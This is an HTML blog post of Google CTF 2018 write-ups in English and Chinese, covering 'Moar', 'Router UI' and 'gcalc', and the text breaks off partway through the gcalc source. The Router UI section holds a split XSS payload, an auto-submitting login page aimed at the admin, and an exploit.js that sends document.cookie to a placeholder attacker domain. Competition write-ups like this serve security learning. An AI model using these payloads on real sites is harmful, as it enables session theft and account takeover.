@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Tianji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Tianji">
+    <meta name="keywords" content="googlectf2018 | Tianji">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>googlectf2018 · Tianji&#39;s Blog</title>
+    <!-- 设置密码 -->
+    <script>
+        (function(){
+            if(''){
+                if (prompt('请输入文章密码','') !== ''){
+                    alert('密码错误！');
+                    history.back();
+                }
+            }
+        })();
+    </script>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180721" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180721" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Tianji&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">googlectf2018</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Tianji's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="height:50vh;">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            googlectf2018
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">1,588</span> / Reading time: <span class="post-count">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/06/26</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;">
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Beginner’s-Quest-Moar"><a href="#Beginner’s-Quest-Moar" class="headerlink" title="Beginner’s Quest - Moar"></a>Beginner’s Quest - Moar</h2><p>When we netcat to the server we can see man socat output only. But man allows us to execute commands. All we need to do is to type !command. Running !ls -la /home/moar reveals some secret file disable_dmz.sh. Let’s cat it.</p>
+<p>man命令允许执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!ls /home/moar</span><br><span class="line">disable_dmz.sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manual page socat(1) line 1 (press h for help or q to quit)!cat /home/moar/disable_dmz.sh</span><br><span class="line">!cat /home/moar/disable_dmz.sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">echo &apos;Disabling DMZ using password CTF&#123;SOmething-CATastr0phic&#125;&apos;</span><br><span class="line">echo CTF&#123;SOmething-CATastr0phic&#125; &gt; /dev/dmz</span><br></pre></td></tr></table></figure>
+<h2 id="Beginner’s-Router-UI"><a href="#Beginner’s-Router-UI" class="headerlink" title="Beginner’s Router UI"></a>Beginner’s Router UI</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line">   &lt;form class=&quot;form-signin&quot; method=&quot;post&quot;&gt;</span><br><span class="line">     &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;OffHub Management Interface&lt;/h1&gt;</span><br><span class="line">     &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;username&quot;&gt;</span><br><span class="line">     &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;password&quot;&gt;</span><br><span class="line">     &lt;button class=&quot;btn btn-block&quot; type=&quot;submit&quot;&gt;Sign in&lt;/button&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>payload;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login:&lt;script src=https:</span><br><span class="line">password:[YOURDOMAIN]/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=https://YOURDOMAIN/exploit.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>由于管理员只会查看邮件，所以需要先构建一个能够自动登录的website.html。</p>
+<p>website.html:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">	&lt;title&gt;Cats&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;form method=&quot;POST&quot; action=&quot;https://router-ui.web.ctfcompetition.com/login&quot;&gt;</span><br><span class="line">		&lt;input name=&quot;username&quot; value=&quot;&amp;lt;script src=https:&quot;&gt;</span><br><span class="line">		&lt;input name=&quot;password&quot; value=&quot;[YOURDOMAIN]/exploit.js&amp;gt;&amp;lt/script&amp;gt;&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;script&gt;</span><br><span class="line">		document.forms[0].submit();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这样，当管理员点击该页面之后，就会自动登录，从而执行我们的payload。</p>
+<p>exploit.js:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.location.href=&apos;https://[YOURDOMAIN]/log.php?&apos;+document.cookie;</span><br></pre></td></tr></table></figure>
+<h2 id="gcalc"><a href="#gcalc" class="headerlink" title="gcalc"></a>gcalc</h2><p>app.js</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> e = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Object</span>.assign ? <span class="built_in">Object</span>.assign : <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> c = <span class="number">1</span>; c &lt; <span class="built_in">arguments</span>.length; c++) &#123;</span><br><span class="line">            <span class="keyword">var</span> d = <span class="built_in">arguments</span>[c];</span><br><span class="line">            <span class="keyword">if</span> (d)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> f <span class="keyword">in</span> d) <span class="built_in">Object</span>.prototype.hasOwnProperty.call(d, f) &amp;&amp; (a[f] = d[f])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    &#125;,</span><br><span class="line">    g = <span class="string">"function"</span> == <span class="keyword">typeof</span> <span class="built_in">Object</span>.defineProperties ? <span class="built_in">Object</span>.defineProperty : <span class="function"><span class="keyword">function</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">        a != <span class="built_in">Array</span>.prototype &amp;&amp; a != <span class="built_in">Object</span>.prototype &amp;&amp; (a[b] = c.value)</span><br><span class="line">    &#125;,</span><br><span class="line">    h = <span class="string">"undefined"</span> != <span class="keyword">typeof</span> <span class="built_in">window</span> &amp;&amp; <span class="built_in">window</span> === <span class="keyword">this</span> ? <span class="keyword">this</span> : <span class="string">"undefined"</span> != <span class="keyword">typeof</span> global &amp;&amp; <span class="literal">null</span> != global ? global : <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> b = h, c = [<span class="string">"Object"</span>, <span class="string">"assign"</span>], d = <span class="number">0</span>; d &lt; c.length - <span class="number">1</span>; d++) &#123;</span><br><span class="line">            <span class="keyword">var</span> f = c[d];</span><br><span class="line">            f <span class="keyword">in</span> b || (b[f] = &#123;&#125;);</span><br><span class="line">            b = b[f]</span><br><span class="line">        &#125;</span><br><span class="line">        c = c[c.length - <span class="number">1</span>];</span><br><span class="line">        d = b[c];</span><br><span class="line">        a = a(d);</span><br><span class="line">        a != d &amp;&amp; <span class="literal">null</span> != a &amp;&amp; g(b, c, &#123;</span><br><span class="line">            configurable: !<span class="number">0</span>,</span><br><span class="line">            writable: !<span class="number">0</span>,</span><br><span class="line">            value: a</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">k(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a || e</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params">a, b, c, d, f</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.location = a;</span><br><span class="line">    <span class="keyword">this</span>.c = b;</span><br><span class="line">    <span class="keyword">this</span>.mdDialog = d;</span><br><span class="line">    <span class="keyword">this</span>.f = f;</span><br><span class="line">    n(<span class="keyword">this</span>);</span><br><span class="line">    a = a.search();</span><br><span class="line">    <span class="keyword">if</span> (a.expr &amp;&amp; a.vars) <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> m = p(a.expr, a.vars);</span><br><span class="line">        <span class="keyword">this</span>.a = <span class="keyword">this</span>.screen = <span class="string">""</span>;</span><br><span class="line">        q(<span class="keyword">this</span>, m);</span><br><span class="line">        <span class="keyword">this</span>.b.ans = <span class="built_in">parseFloat</span>(m) || <span class="number">0</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (v) &#123;</span><br><span class="line">        q(<span class="keyword">this</span>, <span class="string">"Error"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">l.$inject = [<span class="string">"$location"</span>, <span class="string">"$http"</span>, <span class="string">"$httpParamSerializer"</span>, <span class="string">"$mdDialog"</span>, <span class="string">"vcRecaptchaService"</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    a.screen = a.a ? a.screen + b : b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    a.screen = <span class="string">"0"</span>;</span><br><span class="line">    a.a = <span class="string">""</span>;</span><br><span class="line">    a.b = &#123;</span><br><span class="line">        pi: <span class="number">3.14159</span>,</span><br><span class="line">        ans: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    a = <span class="built_in">String</span>(a).toLowerCase();</span><br><span class="line">    b = <span class="built_in">String</span>(b);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(?:[\(\)\*\/\+%\-0-9 ]|\bvars\b|[.]\w+)*$/</span>.test(a)) <span class="keyword">throw</span> <span class="built_in">Error</span>(a);</span><br><span class="line">    b = <span class="built_in">JSON</span>.parse(b, <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp;&amp; <span class="string">"object"</span> === <span class="keyword">typeof</span> b &amp;&amp; !<span class="built_in">Array</span>.isArray(b)) <span class="keyword">return</span> <span class="built_in">Object</span>.assign(<span class="built_in">Object</span>.create(<span class="literal">null</span>), b);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"number"</span> === <span class="keyword">typeof</span> b) <span class="keyword">return</span> b</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"vars"</span>, <span class="string">"return "</span> + a))(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> p(a.a, <span class="built_in">JSON</span>.stringify(a.b))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (b) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Error"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> URL(<span class="string">"https://gcalc2.web.ctfcompetition.com"</span>);</span><br><span class="line">    b.pathname = <span class="string">"/"</span>;</span><br><span class="line">    b.searchParams.set(<span class="string">"expr"</span>, a.a);</span><br><span class="line">    b.searchParams.set(<span class="string">"vars"</span>, <span class="built_in">JSON</span>.stringify(a.b));</span><br><span class="line">    <span class="keyword">return</span> b + <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">l.prototype.permalink = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.mdDialog.show(<span class="keyword">this</span>.mdDialog.alert(&#123;</span><br><span class="line">        title: <span class="string">"Link"</span>,</span><br><span class="line">        htmlContent: t(<span class="keyword">this</span>),</span><br><span class="line">        ok: <span class="string">"Ok"</span></span><br><span class="line">    &#125;))</span><br><span class="line">&#125;;</span><br><span class="line">l.prototype.showCaptcha = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.mdDialog.show(&#123;</span><br><span class="line">        contentElement: <span class="string">"#captchaDialog"</span>,</span><br><span class="line">        parent: angular.element(<span class="built_in">document</span>.body)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">l.prototype.cloud = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="keyword">this</span>.f.getResponse();</span><br><span class="line">    a ? (<span class="keyword">this</span>.c(&#123;</span><br><span class="line">        method: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"/report"</span>,</span><br><span class="line">        data: &#123;</span><br><span class="line">            expr: <span class="keyword">this</span>.a,</span><br><span class="line">            vars: <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.b),</span><br><span class="line">            recaptcha: a</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;), <span class="keyword">this</span>.mdDialog.hide()) : alert(<span class="string">"Wrong captcha."</span>)</span><br><span class="line">&#125;;</span><br><span class="line">l.prototype.btnClick = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/[0-9.]/</span>.test(a)) q(<span class="keyword">this</span>, a), <span class="keyword">this</span>.a += a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/[*\/+%-]/</span>.test(a)) q(<span class="keyword">this</span>, <span class="string">" "</span> + a + <span class="string">" "</span>), <span class="keyword">this</span>.a += a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/[(]/</span>.test(a)) q(<span class="keyword">this</span>, <span class="string">" "</span> + a), <span class="keyword">this</span>.a += a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="regexp">/[)]/</span>.test(a)) q(<span class="keyword">this</span>, a + <span class="string">" "</span>), <span class="keyword">this</span>.a += a;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"\u03c0"</span> == a) q(<span class="keyword">this</span>, <span class="string">" \u03c0 "</span>), <span class="keyword">this</span>.a += <span class="string">" vars.pi"</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">switch</span> (a) 